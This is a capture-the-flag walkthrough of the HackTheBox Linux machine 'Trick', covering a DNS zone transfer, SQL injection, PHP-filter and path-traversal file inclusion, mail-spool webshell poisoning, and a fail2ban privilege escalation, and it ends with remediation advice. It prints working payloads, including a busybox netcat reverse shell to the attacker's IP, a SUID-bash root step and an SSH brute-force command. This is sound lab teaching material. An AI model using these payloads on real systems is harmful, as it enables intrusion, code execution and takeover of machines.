---
title: "HTB CPTS Track: Trick (easy)"
date: 2026-09-29
category: HTB "CPTS Track" writeups
tags:
  - cpts-track
  - htb
  - linux
  - web
  - dns-zone-transfer
  - sql-injection
  - lfi
  - php-filters
  - SMTP-mail-spool poisoning
  - fail2ban
  - bash-suid
  - path-traversal
description: "Black-box Linux box: a DNS zone transfer leaks hidden vhosts, SQLi and PHP-filter LFI leak creds and the nginx config, mail-log poisoning gives RCE as a user, and a writable fail2ban action escalates to root."
keywords: dns zone transfer, axfr, dig, subdomain enumeration, nginx 1.14.2, sql injection, authentication bypass, sqlmap, mysql file privilege, local file inclusion, php://filter, convert.base64-encode, php wrapper, path traversal, dot-dot-slash bypass, /etc/passwd, db_connect.php, smtp, postfix, mail log poisoning, /var/mail, php webshell, busybox reverse shell, ssh private key, id_rsa, fail2ban, action.d, sudo, suid bash, privilege escalation, cyberchef, burp suite, hydra
---

![[trick1.png]]

Trick is a black-box Linux box that rewards enumeration over exploitation. There's no CVE to fire here, the whole path is misconfiguration: an exposed DNS server hands you hidden vhosts, two of those vhosts are riddled with SQLi and LFI, and the root step abuses a service account that can restart fail2ban but also happens to own its config directory. The chain end to end:

1. **DNS zone transfer** off the box's own BIND server leaks the `preprod-payroll` vhost that isn't reachable any other way.
2. A **SQLi auth bypass** gets me into the payroll admin panel; a second SQLi (MySQL `FILE` privilege) plus a **PHP-filter LFI** leak DB creds and the nginx config, which exposes a second vhost, `preprod-marketing`.
3. The marketing vhost has a **path-traversal LFI**. I poison the SMTP mail spool (`/var/mail/michael`) with a PHP webshell and include it for **RCE as michael** (that vhost's PHP-FPM pool runs as michael, not www-data).
4. `michael`'s **SSH private key** gives a stable shell. user.txt.
5. `michael` is in the `security` group that owns fail2ban's `action.d/`, and he can `sudo fail2ban restart`. I swap the ban action for `chmod u+s /bin/bash`, trigger a ban with hydra, and drop into a **SUID root** shell.

> No assumed-breach creds here. Everything starts from an Nmap scan.

---

# Enumeration

## Nmap

```bash
sudo nmap -sC -sV -p- 10.129.227.180 -T5
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Four ports, and two of them stand out. SSH (22) and nginx (80) are expected. The interesting pair is **SMTP on 25** and **BIND DNS on 53**. A DNS server sitting on a web box is a gift, it means I can ask the box about itself, and mail service usually means there's a mailbox somewhere I can write to later. The web root is just a "Coming Soon" Bootstrap template, so the real content is probably hiding behind vhosts.

## Port 80: dead end

Directory fuzzing the default site only turns up template boilerplate, nothing useful:

```bash
ffuf -w directory-list-2.3-medium.txt:FUZZ -u http://10.129.227.180/FUZZ -ic
```

```
assets                  [Status: 301, Size: 185]
css                     [Status: 301, Size: 185]
js                      [Status: 301, Size: 185]
```

`assets`, `css`, `js`, the skeleton of a static theme. No app here. I also glanced at the nginx version (1.14.2) to see if there was a known bug worth chasing, but nothing lined up with this box, so I dropped it and moved to DNS:

![[trick2.png]]

## Port 53: DNS is the way in

First, a reverse lookup against the box's own DNS server to learn what it calls itself:

```bash
dig -x 10.129.227.180 @10.129.227.180
```

```
;; ANSWER SECTION:
180.227.129.10.in-addr.arpa. 604800 IN	PTR	trick.htb.

;; AUTHORITY SECTION:
227.129.10.in-addr.arpa. 604800	IN	NS	trick.htb.
```

The domain is `trick.htb`, and the box is authoritative for it. Add it to hosts:

```bash
10.129.227.180 trick.htb
```

Since it's the authoritative nameserver, I try a full zone transfer (AXFR). That's the one query a nameserver should never answer for a stranger:

```bash
dig axfr @trick.htb trick.htb
```

```
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
```

> **Why a zone transfer leaks this:** AXFR is the mechanism a primary nameserver uses to replicate its entire zone to a secondary. If the server doesn't restrict who's allowed to request it (`allow-transfer`), anyone can pull the whole zone in one query, every record, including internal-only hostnames that were never meant to be public. Here it hands me `preprod-payroll.trick.htb`, a vhost that resolves to nothing without this record.

Added the new name to my `/etc/hosts`:

```bash
10.129.227.180 trick.htb preprod-payroll.trick.htb
```

---

# Foothold Recon: the payroll vhost

`preprod-payroll.trick.htb` serves an admin login:

![[trick3.png]]

An admin login on a "preprod" app is exactly the kind of thing that gets shipped with lazy auth, so I throw a classic SQL injection auth bypass at the username field:

![[trick4.png]]

```
sdsd' or '1'+'1';-- -
```

And it drops me straight into the dashboard as administrator:

![[trick5.png]]

> **Why the auth bypass works:** the login query is almost certainly built by string concatenation, something like `SELECT * FROM users WHERE user='$u' AND pass='$p'`. The payload closes the username string, adds `OR '1'+'1'` (which MySQL evaluates as truthy), and comments out the rest of the query with `-- -`, including the password check. The `WHERE` clause is now always true, so the app logs me in as the first user it finds, the admin.

## Leaking the Enemigosss password

Poking around `Users > Action > Edit`, one account, `Enemigosss`, comes up with its password field pre-populated (a bad habit, edit forms shouldn't round-trip the plaintext):

![[trick6.png]]

![[trick7.png]]

The field is masked in the UI, but the value has to reach the browser to populate the field. So I catch the request in Burp and read it straight out of the response:

![[trick8.png]]

**`Enemigosss / SuperGucciRainbowCake`**

These creds don't get me anywhere new (no SSH, no SMTP auth with them), so I note them and keep looking.

## LFI via PHP filters

The app's pages load through a `page` parameter, and it happily includes arbitrary `.php` files by name, that's local file inclusion:

![[trick9.png]]

Straight inclusion just executes the PHP, so I can't read source that way. This is where PHP filter wrappers come in ([HackTricks: File Inclusion](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)):

```
http://preprod-payroll.trick.htb/index.php?page=PHP://filter/convert.base64-encode/resource=login
```

> **Why `php://filter` turns LFI into source disclosure:** normally an `include()` on a `.php` file runs it, so you see the output, not the code. The `convert.base64-encode` filter transforms the file's bytes before the include engine ever interprets them, so the target is base64-encoded into inert text and echoed back. The include never executes it. Decode the blob locally and you have the raw source. (The `php://` scheme is case-insensitive, which is handy if a naive filter blocks lowercase `php://`.)

The response is a base64 blob:

![[trick10.png]]

Decode it in [CyberChef](https://gchq.github.io/CyberChef/):

![[trick11.png]]

The source references a couple of other files, and `db_connect.php` is the obvious one to grab next:

```
http://preprod-payroll.trick.htb/index.php?page=PHP://filter/convert.base64-encode/resource=db_connect
```

![[trick12.png]]

Decoded, it gives up the database credentials:

![[trick13.png]]

**`remo / TrulyImpossiblePasswordLmao123`**

## Reading the nginx config via SQLi FILE privilege

There's a second, cleaner injection in `manage_user.php?id=`. I let sqlmap confirm it and enumerate the DB user's privileges:

```bash
sqlmap --url "preprod-payroll.trick.htb/manage_user.php?id=3" --privileges
```

```
Parameter: id (GET)
    Type: boolean-based blind
    Type: time-based blind
    Type: UNION query ... 8 columns
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
```

`remo` (the same DB user from `db_connect.php`) has the **`FILE`** privilege, which means MySQL can read files off disk for me. I use it to pull the nginx site config:

```bash
sqlmap --url "preprod-payroll.trick.htb/manage_user.php?id=3" --file-read="/etc/nginx/sites-available/default"
```

> **Why `FILE` matters:** the MySQL `FILE` privilege lets a query call `LOAD_FILE()` to read any file the mysqld process can read, and write files with `INTO OUTFILE`. Chained through an injection, it turns a SQLi into arbitrary file read on the host, no shell required. sqlmap just wraps that in `--file-read`.

The retrieved config lists three server blocks, and the third is a vhost I hadn't seen:

```text
server {
	server_name preprod-marketing.trick.htb;
	root /var/www/market;
	location ~ \.php$ {
		fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
	}
}
```

There's a **`preprod-marketing.trick.htb`** vhost, added the host to my `/etc/hosts/`:

```bash
10.129.227.180 trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb
```

---

# User: LFI + Mail-Log Poisoning to RCE as michael

The marketing site has the same `page` include pattern:

![[trick14.png]]

But `php://filter` is filtered here. Plain `../` is stripped too, so I fall back to a traversal-filter bypass ([HackTricks: File Inclusion](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)):

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
```

![[trick15.png]]

> **Why `....//` gets through:** the filter does a single, non-recursive pass that removes `../` sequences. Feed it `....//` and after it deletes the inner `../` what's left is `../`, the traversal it was trying to block. Any filter that sanitizes once instead of looping is vulnerable to this.

`/etc/passwd` confirms a login user, **michael**. Now I have file *read* on the box and a mailbox I can write to (SMTP on 25). That combination is a classic LFI-to-RCE via log poisoning: write PHP into a file the target will `include()`.

## Poisoning the mailbox

I talk to Postfix directly over telnet and send michael a message whose body is a tiny PHP webshell:

```text
telnet 10.129.227.180 25

MAIL FROM: 1kb2
RCPT TO: michael NOTIFY=success,failure
DATA
<?=`$_GET[0]`?>
.
250 2.0.0 Ok: queued as 0BD3D409A3
```

![[trick16.png]]

The message lands in `/var/mail/michael`. `` <?=`$_GET[0]`?> `` is shorthand for "echo the output of shell-executing whatever comes in as GET parameter `0`".

> **Why log/mail poisoning works:** LFI executes whatever PHP is in the file it includes. Any file an attacker can write attacker-controlled text into, an access log, an auth log, or here the mail spool, becomes a code-drop. Include `/var/mail/michael`, the PHP body runs, and because this vhost's FPM pool runs as michael, so does my code.

## Triggering the reverse shell

Include the poisoned mailbox and pass the reverse-shell command in `0`:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/mail/michael&0=busybox%20nc%2010.10.14.137%206767%20-e%20sh
```

With a listener on `6767`, that gives a shell as michael:

![[trick17.png]]

michael's `.ssh` directory has a private key, so I grab it for a stable, non-janky shell instead of living in the netcat session:

```text
/home/michael/.ssh
-rw-------  1 michael michael 1.8K May 12  2022 id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
... (trimmed) ...
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
-----END OPENSSH PRIVATE KEY-----
```

Save it locally, tighten permissions, and log in:

```bash
chmod 600 id_rsa
ssh -i id_rsa michael@10.129.227.180
```

![[trick18.png]]

```bash
michael@trick:~$ cat user.txt
<FLAG>
```

**user.txt captured.**

---

# Root: Writable fail2ban Action + sudo Restart

Check what michael can run as root, and what groups he's in:

```bash
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

michael@trick:~$ sudo -l
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Two facts to line up: michael is in the **`security`** group, and he can restart **fail2ban** as root with no password. Look at fail2ban's action directory:

```bash
michael@trick:/etc/fail2ban$ ls -lah
drwxrwx---   2 root security 4.0K action.d
```

`action.d` is owned by `root:security` and is group-writable. michael can't edit the files inside directly (they're `root:root`):

```bash
michael@trick:/etc/fail2ban/action.d$ chmod g+w iptables-multiport.conf
chmod: changing permissions of 'iptables-multiport.conf': Operation not permitted
```

But write access on the *directory* is enough: I can delete a file and drop a replacement with the same name.

> **Why this is a root escalation:** fail2ban runs as root. Its action files (`action.d/*.conf`) define the shell commands it runs when it bans or unbans an IP. If I control the contents of an action file and can make fail2ban reload it (the sudo restart) and then fire (trigger a ban), I get arbitrary command execution as root. The file being `root:root` doesn't save it, because write on the parent directory lets me `rm` the original and `mv` my own version into its place.

Rewrite the ban action so that instead of adding an iptables rule, it makes `/bin/bash` SUID root. Because I can't edit in place, I build the modified file in my home directory, delete the original, and move mine in:

```bash
sed "s/<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf > config.conf

rm -f /etc/fail2ban/action.d/iptables-multiport.conf

mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf

sudo /etc/init.d/fail2ban restart
```

```
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

The config is loaded, but the action only runs when a ban actually fires. So I generate failed SSH logins from my attack box to trip the jail:

```bash
hydra 10.129.227.180 ssh -l root -P /usr/share/wordlists/rockyou.txt.gz
```

I don't care about cracking anything, I just need enough failed attempts to trigger a ban, which runs my poisoned action as root. A moment later `/bin/bash` is SUID:

```bash
michael@trick:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

`bash -p` keeps the effective UID of the SUID binary instead of dropping privileges:

```bash
michael@trick:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
<FLAG>
```

**root.txt captured. Box owned.**

---

# Remediation

- **Restrict zone transfers.** Set `allow-transfer` to trusted secondaries only (or none). Leaking the full zone exposed the entire attack surface here.
- **Use parameterized queries.** Both the login and `manage_user.php` were string-concatenated SQL. Prepared statements kill the auth bypass and the `FILE`-privilege read. Also, the DB account shouldn't have `FILE` at all, and the app shouldn't reflect stored passwords back to edit forms.
- **Don't build includes from user input.** `include($_GET['page'])` is the root cause of both LFIs. Whitelist the pages that may be loaded, and disable PHP wrapper schemes (`allow_url_include`, and filter/wrapper usage) where they aren't needed.
- **Lock down the mail spool .** A web-reachable LFI plus a writable mailbox is what enabled RCE. Separate the web user from real login users and keep `/var/mail` out of any include-able path.
- **Fix the fail2ban sudo combo.** Granting a user's group write access to `action.d` while also letting that user restart fail2ban as root is a direct path to root. Remove group-write on the config, or don't grant the sudo restart, you need both to escalate.

---

Reference used:
- [HackTricks: File Inclusion / LFI (php://filter and traversal bypasses)](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
